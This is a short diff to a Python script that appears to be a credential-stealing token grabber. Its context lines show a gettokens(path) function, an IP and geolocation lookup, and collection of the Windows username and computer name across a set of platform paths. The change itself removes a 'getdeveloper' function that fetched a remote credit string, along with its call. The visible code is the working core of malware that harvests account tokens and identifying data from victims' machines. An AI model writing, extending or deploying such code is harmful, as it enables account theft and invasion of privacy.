@@ -98,14 +98,6 @@ def gettokens(path):
 					tokens.append(token)
 	return tokens
 
-def getdeveloper():
-	dev = "| 2022 by SirThirrygolooo | "
-	try:
-		dev = urlopen(Request("")).read().decode()
-	except:
-		pass
-	return dev
-
 def getip():
 	ip = org = loc = city = country = region = googlemap = "None"
 	try:
@@ -497,7 +489,6 @@ def main():
 	pc_username = os.getenv("UserName")
 	pc_name = os.getenv("COMPUTERNAME")
 	user_path_name = os.getenv("userprofile").split("\\")[2]
-	developer = getdeveloper()
 	for platform, path in PATHS.items():
 		if not os.path.exists(path):
 			continue
